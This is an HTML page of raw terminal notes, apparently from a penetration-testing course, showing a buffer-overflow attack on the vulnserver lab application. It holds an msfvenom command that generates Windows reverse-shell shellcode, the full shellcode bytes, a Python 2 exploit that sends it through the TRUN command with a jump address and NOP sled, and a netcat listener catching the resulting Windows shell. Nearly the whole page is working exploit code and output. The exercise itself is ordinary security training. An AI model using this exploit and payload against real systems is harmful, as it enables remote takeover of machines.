<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Generating Shellcode &amp; Gaining Root</title>
</head><body>┌──(lolpotch㉿Lolpotch)-[~]<br/>
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=172.20.72.111 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"<br/>
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br/>
Found 11 compatible encoders<br/>
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai<br/>
x86/shikata_ga_nai succeeded with size 351 (iteration=0)<br/>
x86/shikata_ga_nai chosen with final size 351<br/>
Payload size: 351 bytes<br/>
Final size of c file: 1506 bytes<br/>
unsigned char buf[] =<br/>
"\xba\xaa\x89\x53\x13\xdb\xd7\xd9\x74\x24\xf4\x5b\x29\xc9"<br/>
"\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x69\x8d\xb1\xe6\x91"<br/>
"\x66\xb7\x09\x69\x77\xd8\x80\x8c\x46\xd8\xf7\xc5\xf9\xe8"<br/>
"\x7c\x8b\xf5\x83\xd1\x3f\x8d\xe6\xfd\x30\x26\x4c\xd8\x7f"<br/>
"\xb7\xfd\x18\x1e\x3b\xfc\x4c\xc0\x02\xcf\x80\x01\x42\x32"<br/>
"\x68\x53\x1b\x38\xdf\x43\x28\x74\xdc\xe8\x62\x98\x64\x0d"<br/>
"\x32\x9b\x45\x80\x48\xc2\x45\x23\x9c\x7e\xcc\x3b\xc1\xbb"<br/>
"\x86\xb0\x31\x37\x19\x10\x08\xb8\xb6\x5d\xa4\x4b\xc6\x9a"<br/>
"\x03\xb4\xbd\xd2\x77\x49\xc6\x21\x05\x95\x43\xb1\xad\x5e"<br/>
"\xf3\x1d\x4f\xb2\x62\xd6\x43\x7f\xe0\xb0\x47\x7e\x25\xcb"<br/>
"\x7c\x0b\xc8\x1b\xf5\x4f\xef\xbf\x5d\x0b\x8e\xe6\x3b\xfa"<br/>
"\xaf\xf8\xe3\xa3\x15\x73\x09\xb7\x27\xde\x46\x74\x0a\xe0"<br/>
"\x96\x12\x1d\x93\xa4\xbd\xb5\x3b\x85\x36\x10\xbc\xea\x6c"<br/>
"\xe4\x52\x15\x8f\x15\x7b\xd2\xdb\x45\x13\xf3\x63\x0e\xe3"<br/>
"\xfc\xb1\x81\xb3\x52\x6a\x62\x63\x13\xda\x0a\x69\x9c\x05"<br/>
"\x2a\x92\x76\x2e\xc1\x69\x11\xfd\x02\x39\x8e\x95\x28\xb9"<br/>
"\x41\x3a\xa4\x5f\x0b\xd2\xe0\xc8\xa4\x4b\xa9\x82\x55\x93"<br/>
"\x67\xef\x56\x1f\x84\x10\x18\xe8\xe1\x02\xcd\x18\xbc\x78"<br/>
"\x58\x26\x6a\x14\x06\xb5\xf1\xe4\x41\xa6\xad\xb3\x06\x18"<br/>
"\xa4\x51\xbb\x03\x1e\x47\x46\xd5\x59\xc3\x9d\x26\x67\xca"<br/>
"\x50\x12\x43\xdc\xac\x9b\xcf\x88\x60\xca\x99\x66\xc7\xa4"<br/>
"\x6b\xd0\x91\x1b\x22\xb4\x64\x50\xf5\xc2\x68\xbd\x83\x2a"<br/>
"\xd8\x68\xd2\x55\xd5\xfc\xd2\x2e\x0b\x9d\x1d\xe5\x8f\xbd"<br/>
"\xff\x2f\xfa\x55\xa6\xba\x47\x38\x59\x11\x8b\x45\xda\x93"<br/>
"\x74\xb2\xc2\xd6\x71\xfe\x44\x0b\x08\x6f\x21\x2b\xbf\x90"<br/>
"\x60";<br/>
<br/>
┌──(lolpotch㉿Lolpotch)-[~/Downloads/heath_course]<br/>
└─$ cat 2.py<br/>
#!/usr/bin/python<br/>
import sys, socket<br/>
<br/>
# Badchars below are generated from msfvenom<br/>
# msfvenom -p windows/shell_reverse_tcp LHOST=172.20.72.111 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"<br/>
overflow = (<br/>
"\xba\xaa\x89\x53\x13\xdb\xd7\xd9\x74\x24\xf4\x5b\x29\xc9"<br/>
"\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x69\x8d\xb1\xe6\x91"<br/>
"\x66\xb7\x09\x69\x77\xd8\x80\x8c\x46\xd8\xf7\xc5\xf9\xe8"<br/>
"\x7c\x8b\xf5\x83\xd1\x3f\x8d\xe6\xfd\x30\x26\x4c\xd8\x7f"<br/>
"\xb7\xfd\x18\x1e\x3b\xfc\x4c\xc0\x02\xcf\x80\x01\x42\x32"<br/>
"\x68\x53\x1b\x38\xdf\x43\x28\x74\xdc\xe8\x62\x98\x64\x0d"<br/>
"\x32\x9b\x45\x80\x48\xc2\x45\x23\x9c\x7e\xcc\x3b\xc1\xbb"<br/>
"\x86\xb0\x31\x37\x19\x10\x08\xb8\xb6\x5d\xa4\x4b\xc6\x9a"<br/>
"\x03\xb4\xbd\xd2\x77\x49\xc6\x21\x05\x95\x43\xb1\xad\x5e"<br/>
"\xf3\x1d\x4f\xb2\x62\xd6\x43\x7f\xe0\xb0\x47\x7e\x25\xcb"<br/>
"\x7c\x0b\xc8\x1b\xf5\x4f\xef\xbf\x5d\x0b\x8e\xe6\x3b\xfa"<br/>
"\xaf\xf8\xe3\xa3\x15\x73\x09\xb7\x27\xde\x46\x74\x0a\xe0"<br/>
"\x96\x12\x1d\x93\xa4\xbd\xb5\x3b\x85\x36\x10\xbc\xea\x6c"<br/>
"\xe4\x52\x15\x8f\x15\x7b\xd2\xdb\x45\x13\xf3\x63\x0e\xe3"<br/>
"\xfc\xb1\x81\xb3\x52\x6a\x62\x63\x13\xda\x0a\x69\x9c\x05"<br/>
"\x2a\x92\x76\x2e\xc1\x69\x11\xfd\x02\x39\x8e\x95\x28\xb9"<br/>
"\x41\x3a\xa4\x5f\x0b\xd2\xe0\xc8\xa4\x4b\xa9\x82\x55\x93"<br/>
"\x67\xef\x56\x1f\x84\x10\x18\xe8\xe1\x02\xcd\x18\xbc\x78"<br/>
"\x58\x26\x6a\x14\x06\xb5\xf1\xe4\x41\xa6\xad\xb3\x06\x18"<br/>
"\xa4\x51\xbb\x03\x1e\x47\x46\xd5\x59\xc3\x9d\x26\x67\xca"<br/>
"\x50\x12\x43\xdc\xac\x9b\xcf\x88\x60\xca\x99\x66\xc7\xa4"<br/>
"\x6b\xd0\x91\x1b\x22\xb4\x64\x50\xf5\xc2\x68\xbd\x83\x2a"<br/>
"\xd8\x68\xd2\x55\xd5\xfc\xd2\x2e\x0b\x9d\x1d\xe5\x8f\xbd"<br/>
"\xff\x2f\xfa\x55\xa6\xba\x47\x38\x59\x11\x8b\x45\xda\x93"<br/>
"\x74\xb2\xc2\xd6\x71\xfe\x44\x0b\x08\x6f\x21\x2b\xbf\x90"<br/>
"\x60")<br/>
<br/>
<br/>
# EBP filled with 41 from "A"<br/>
# "\xaf\x11\x50\x62" is based on 0x625011af we found in the previous module<br/>
# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;jump command &nbsp; &nbsp; &nbsp;padding<br/>
shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow<br/>
<br/>
<br/>
try: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #IP Address &nbsp; &nbsp; &nbsp; Port<br/>
&nbsp; &nbsp; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br/>
&nbsp; &nbsp; s.connect(('192.168.1.9', 9999))<br/>
<br/>
&nbsp; &nbsp; # &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TRUN is based on command we found crashed when spiked<br/>
&nbsp; &nbsp; s.send(('TRUN /.:/' + shellcode))<br/>
&nbsp; &nbsp; s.close()<br/>
<br/>
except:<br/>
&nbsp; &nbsp; print "Error connecting to the server"<br/>
&nbsp; &nbsp; sys.exit()<br/>
<br/>
┌──(lolpotch㉿Lolpotch)-[~/Downloads/heath_course]<br/>
└─$ python2 2.py<br/>
<br/>
┌──(lolpotch㉿Lolpotch)-[~]<br/>
└─$ nc -nvlp 4444<br/>
listening on [any] 4444 ...<br/>
connect to [172.20.72.111] from (UNKNOWN) [172.20.64.1] 44179<br/>
Microsoft Windows [Version 10.0.19045.4046]<br/>
(c) Microsoft Corporation. All rights reserved.<br/>
<br/>
D:\Program Files\vulnserver-master&gt;whoami<br/>
whoami<br/>
lolpotch\chandra</body></html>